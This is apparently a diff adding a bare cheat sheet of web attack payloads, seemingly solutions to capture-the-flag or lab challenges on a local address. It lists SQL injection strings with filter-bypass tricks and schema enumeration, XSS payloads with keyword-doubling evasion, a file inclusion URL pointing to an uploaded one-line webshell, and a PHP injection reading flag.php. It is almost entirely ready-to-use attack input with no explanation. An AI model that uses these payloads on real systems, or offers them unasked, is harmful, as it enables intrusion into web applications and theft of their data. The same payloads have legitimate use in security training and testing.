@@ -1,0 +1,21 @@
+sql1:         1' union select 1,flag from f1ag # 
+sql2:         1'/**/union/**/Select/**/1,f1ag/**/from/**/admin/**/#
+sql3：        1%df' union select 1,flag from admini %23 
+sql4:         1'/**/union/**/Select/**/*/**/from/**/((Select/**/1)A/**/join/**/(Select/**/flag/**/from/**/root)B)/**/#
+sql_blind     1' union select 1,2,flag from flag #
+xss1:         name=<script>alert(1)</script>
+xss2:         keyload=hack'onmouseover='alert(1)'
+xss3:         keyload="><a href="javascript:alert(1)">hack</a>
+xss4：        keyload="><a hhrefref="javasscriptcript:alert(1)">hack</a>
+
+
+upload4：http://192.168.43.229/baji/inclusion.php?page=./Upload4/yijuhua.png
+本地文件包含：?hello=);print_r%20(file("./flag.php"));//
+
+
+
+
+1' union select user(),database() #
+1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='test' #
+1' union select 1,group_concat(column_name) from information_schema.columns where table_name='f1ag' #
+
